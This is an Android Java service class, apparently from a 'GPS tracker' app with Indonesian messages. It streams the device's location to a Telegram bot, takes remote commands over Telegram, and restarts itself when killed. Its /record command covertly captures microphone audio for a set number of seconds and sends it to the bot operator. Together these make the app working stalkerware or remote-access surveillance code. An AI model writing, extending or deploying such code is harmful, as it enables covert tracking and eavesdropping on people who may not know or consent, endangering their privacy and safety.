package com.example.gpsstandalone;

import android.Manifest;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.SystemClock;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class LocationService extends Service {

    private static final String TAG = "LocationService";

    private LocationManager locationManager;
    private LocationStorageHelper dbHelper;
    private TelegramHelper telegramHelper;
    private SharedPreferences prefs;

    private String token, chatId, uniqueId;
    private int interval;

    private final Handler commandHandler = new Handler();
    private final Runnable commandRunnable = new Runnable() {
        @Override
        public void run() {
            telegramHelper.checkCommands(token, chatId, command -> {
                if (command.trim().equalsIgnoreCase("/status")) {
                    handleStatusCommand();
                }
                else if (command.equals("/lokasi")) {
                    sendCurrentLocation();
                }
                else if (command.startsWith("/interval")) {
                    handleIntervalCommand(command);
                }
                else if (command.startsWith("/record")) {
                    String[] parts = command.split(" ");
                    int duration = 60; // default

                    if (parts.length >= 2) {
                        try {
                            duration = Integer.parseInt(parts[1]);
                        } catch (NumberFormatException e) {
                            telegramHelper.sendMessage(token, chatId, "Format salah. Contoh: /record 30");
                            return;
                        }
                    }

                    telegramHelper.sendMessage(token, chatId, "Merekam suara selama " + duration + " detik...");
                    VoiceRecorder.getInstance().startRecording(getApplicationContext(), duration, token, chatId);
                }

            });
            commandHandler.postDelayed(this, 10000); // periksa setiap 60 detik
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();

        prefs = getSharedPreferences("config", MODE_PRIVATE);
        token = prefs.getString("bot_token", "");
        chatId = prefs.getString("chat_id", "");
        uniqueId = prefs.getString("unique_id", "unknown");

        try {
            interval = Integer.parseInt(prefs.getString("interval", "60"));
        } catch (NumberFormatException e) {
            interval = 30;
        }

        dbHelper = new LocationStorageHelper(this);
        telegramHelper = new TelegramHelper(getApplicationContext());
        locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "LocationService started");

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationHelper.createForegroundNotification(this);
            startForeground(1, NotificationHelper.getNotification(this));
        }

        requestLocationUpdates();
        retryOfflineData();
        commandHandler.post(commandRunnable);

        return START_STICKY;
    }

    private void requestLocationUpdates() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
                ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Location permission not granted");
            stopSelf();
            return;
        }

        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, interval * 1000L, 0, locationListener, Looper.getMainLooper());
        locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, interval * 1000L, 0, locationListener, Looper.getMainLooper());
    }

    private final LocationListener locationListener = new LocationListener() {
        @Override
        public void onLocationChanged(Location location) {
            Log.d(TAG, "Location: " + location.getLatitude() + ", " + location.getLongitude());
            String time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
            String caption = uniqueId + "\nLat: " + location.getLatitude() + "\nLon: " + location.getLongitude()
                    + "\nTime: " + time
                    + "\n\nhttps://maps.google.com/?q=" + location.getLatitude() + "," + location.getLongitude();

            if (isOnline()) {
                telegramHelper.sendLocation(token, chatId, location.getLatitude(), location.getLongitude(), caption);
                retryOfflineData();
            } else {
                dbHelper.save(location.getLatitude(), location.getLongitude(), caption);
                Log.d(TAG, "Saved location offline");
            }
        }

        @Override public void onStatusChanged(String provider, int status, android.os.Bundle extras) {}
        @Override public void onProviderEnabled(String provider) {}
        @Override public void onProviderDisabled(String provider) {}
    };

    private void retryOfflineData() {
        if (!isOnline()) return;

        List<LocationStorageHelper.LocationData> all = dbHelper.getAll();
        for (LocationStorageHelper.LocationData data : all) {
            telegramHelper.sendLocation(token, chatId, data.lat, data.lon, data.caption);
            dbHelper.delete(data.id);
        }
    }

    private void handleStatusCommand() {
        String time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
        String status = "📍 *GPS Tracker Status*\n" +
                "🆔 ID: " + uniqueId + "\n" +
                "⏱️ Interval: " + interval + " detik\n" +
                "📡 Online: " + (isOnline() ? "Ya" : "Tidak") + "\n" +
                "🕒 Waktu: " + time;

        telegramHelper.sendMessage(token, chatId, status);
    }


    private void sendCurrentLocation() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            telegramHelper.sendMessage(token, chatId, "⚠️ Izin lokasi belum diberikan.");
            return;
        }

        LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);

        if (location == null) {
            location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
        }

        if (location != null) {
            String time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
            String caption = "📍 Lokasi Saat Ini (" + uniqueId + ")\n" +
                    "Lat: " + location.getLatitude() + "\n" +
                    "Lon: " + location.getLongitude() + "\n" +
                    "Waktu: " + time + "\n\n" +
                    "https://maps.google.com/?q=" + location.getLatitude() + "," + location.getLongitude();

            telegramHelper.sendLocation(token, chatId, location.getLatitude(), location.getLongitude(), caption);
        } else {
            telegramHelper.sendMessage(token, chatId, "❌ Lokasi tidak tersedia.");
        }
    }

    private void handleIntervalCommand(String command) {
        String[] parts = command.split(" ");
        if (parts.length == 2) {
            try {
                int newInterval = Integer.parseInt(parts[1]);

                if (newInterval < 10 || newInterval > 3600) {
                    telegramHelper.sendMessage(token, chatId, "❌ Interval harus antara 10 dan 3600 detik.");
                    return;
                }

                SharedPreferences.Editor editor = prefs.edit();
                editor.putString("interval", String.valueOf(newInterval));
                editor.apply();

                //restart biar langusng berlaku
                restartLocationService();


                telegramHelper.sendMessage(token, chatId, "✅ Interval diperbarui menjadi " + newInterval + " detik.");

            } catch (NumberFormatException e) {
                telegramHelper.sendMessage(token, chatId, "⚠️ Format tidak valid. Contoh: /interval 30");
            }
        } else {
            telegramHelper.sendMessage(token, chatId, "⚠️ Format tidak valid. Contoh: /interval 30");
        }
    }




    private void restartLocationService() {
        Context appContext = getApplicationContext();
        Intent restartIntent = new Intent(appContext, LocationService.class);

        // Stop service jika sedang jalan
        appContext.stopService(restartIntent);

        // Start service sesuai versi Android
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            // Android 8.0+ (API 26+), pakai startForegroundService
            ContextCompat.startForegroundService(appContext, restartIntent);
        } else {
            // Android 7.x dan di bawahnya (API < 26), cukup startService
            appContext.startService(restartIntent);
        }
    }



    private boolean isOnline() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo net = cm.getActiveNetworkInfo();
        return net != null && net.isConnected();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (locationManager != null && locationListener != null) {
            locationManager.removeUpdates(locationListener);
        }
        commandHandler.removeCallbacks(commandRunnable);
        Log.d(TAG, "LocationService stopped");
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Log.d("LocationService", "onTaskRemoved: Scheduling restart...");

        Intent restartServiceIntent = new Intent(getApplicationContext(), LocationService.class);
        restartServiceIntent.setPackage(getPackageName());

        PendingIntent restartServicePendingIntent = PendingIntent.getService(
                getApplicationContext(),
                1,
                restartServiceIntent,
                PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE
        );

        AlarmManager alarmService = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        alarmService.set(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() + 1000,
                restartServicePendingIntent
        );

        super.onTaskRemoved(rootIntent);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
